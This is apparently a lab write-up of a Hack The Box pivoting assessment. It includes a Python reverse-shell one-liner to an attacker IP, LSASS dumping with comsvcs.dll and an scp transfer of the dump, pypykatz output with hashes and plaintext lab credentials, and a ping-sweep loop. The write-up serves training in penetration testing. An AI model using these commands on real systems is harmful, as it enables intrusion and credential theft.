# Assessment

## Enumeration

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption><p>webadmin</p></figcaption></figure>

Seems to be a Linux host running on this system and there are 2 interfaces as below.

<figure><img src="../../.gitbook/assets/image (31) (1) (1).png" alt=""><figcaption><p>another network segment that we could use to pivot.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1).png" alt=""><figcaption><p>mlefay:Plain Human work!</p></figcaption></figure>

I decided to get a reverse shell for more control over the foothold sytem.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption><p>but it wasn't nessesary</p></figcaption></figure>

I moved the id\_rsa file and ssh to the system with that file. Now I'm in the system with the same credentials but with ssh.

Next I will try to dynamic port forward with ssh.

Then perform nmap scan to find the host that are up.

<figure><img src="../../.gitbook/assets/image (15) (2).png" alt=""><figcaption><p>172.16.5.35</p></figcaption></figure>

## Scan Host2

**Scan result**

```
Nmap scan report for 172.16.5.35
Host is up (0.20s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 204.43 seconds
```

now we know that RDP is open on this system we can try to use the credentials against the this host.

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption><p>pivot-srv01/mlefay</p></figcaption></figure>

We got access to the pivot-srv01/mlefay and as a local Admin.&#x20;

```
PS C:\Windows\system32> Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True' AND Disabled='False'"

AccountType : 512
Caption     : PIVOT-SRV01\Administrator
Domain      : PIVOT-SRV01
SID         : S-1-5-21-1602415334-2376822715-119304339-500
FullName    :
Name        : Administrator

AccountType : 512
Caption     : PIVOT-SRV01\apendragon
Domain      : PIVOT-SRV01
SID         : S-1-5-21-1602415334-2376822715-119304339-1002
FullName    : apendragon
Name        : apendragon

AccountType : 512
Caption     : PIVOT-SRV01\mlefay
Domain      : PIVOT-SRV01
SID         : S-1-5-21-1602415334-2376822715-119304339-1003
FullName    : mlefay
Name        : mlefay
```

**2nd Interface 172.16.6.35**

```
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7dab:2573:1024:6c4a%4
   IPv4 Address. . . . . . . . . . . : 172.16.5.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.5.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::e041:c210:35fe:c55a%5
   IPv4 Address. . . . . . . . . . . : 172.16.6.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :
```

To find the users credentials through the lsass filem, we dump the lsass process and scp to the webadmin host using the following command.

```powershell
Get-Process lsass
# get the process lsass was running

rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
# dump the lsass

scp -i .\id_rsa C:\lsass.dmp webadmin@172.16.5.15:~/
# transfer the lsass to webadmin
```

Properties -> Security -> Advanced -> Disable inheritance -> Add -> Select a principal -> Enter the object name to select (add windows username) -> (check full control) -> OK -> Apply -> OK

All the above settings is just to set the permission of the id\_rsa file `chmod 0400 id_rsa` 😒

<figure><img src="../../.gitbook/assets/image (50) (1).png" alt=""><figcaption><p>make sure the orders are correct because Windows is trash.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (42) (1).png" alt=""><figcaption><p>Transfer file from pivot host to </p></figcaption></figure>

using `pypykatz lsa minidump lsass.dmp` we found the user `vfrank:Imply wet Unmasked!`

```
== LogonSession ==
authentication_id 160373 (27275)
session_id 0
username vfrank
domainname INLANEFREIGHT
logon_server ACADEMY-PIVOT-D
logon_time 2023-07-02T11:06:10.741078+00:00
sid S-1-5-21-3858284412-1730064152-742000644-1103
luid 160373
        == MSV ==
                Username: vfrank
                Domain: INLANEFREIGHT
                LM: NA
                NT: 2e16a00be74fa0bf862b4256d0347e83
                SHA1: b055c7614a5520ea0fc1184ac02c88096e447e0b
                DPAPI: 97ead6d940822b2c57b18885ffcc5fb4
        == WDIGEST [27275]==
                username vfrank
                domainname INLANEFREIGHT
                password None
                password (hex)
        == Kerberos ==
                Username: vfrank
                Domain: INLANEFREIGHT.LOCAL
                Password: Imply wet Unmasked!
                password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
        == WDIGEST [27275]==
                username vfrank
                domainname INLANEFREIGHT
                password None
                password (hex)
        == DPAPI [27275]==
                luid 160373
                key_guid 560f4286-76f2-4f0f-90a9-5135bbc0104f
                masterkey 4fc3adb204f30f6a226f637b66be93811cee121eaed0e4ec2e8bc023d2d38d396e0c4e827aa49c6b1c2a58f6428ca725be027497ad10f8dd386d5926e7bf73b7
                sha1_masterkey a3e3a61d9a74541a56c3a822d5470bedbb2d4fb5
```

I then performed a **ping sweep** on the 172.16.6.X to find another host to pivot to using cmd.

```
for /L %i in (1,1,255) do @ping -n 1 -w 200 172.16.6.%i > nul && echo 172.16.6.%i is up
```

and we found the following address

<figure><img src="../../.gitbook/assets/image (75) (1).png" alt=""><figcaption><p>172.16.6.25</p></figcaption></figure>

Since 172.16.6.35 is our address we can ignore that and focus on 172.16.6.25

Now that we know the ipaddress of the target and we have the credentials, next is to try remote desktop connection (we know from the question of hack the box that the target is running windows. becase the flag is located in C:\Flag.txt)

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption><p>And just like that we are in and got the flag.</p></figcaption></figure>

next we found another interface on this machine and seems like we have to perform double pivots. However I'm not sure about the credentials on the Domain Controller.

It was not the case here. I found the flag in the C directory where the DC admin files system was already mounted lol

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
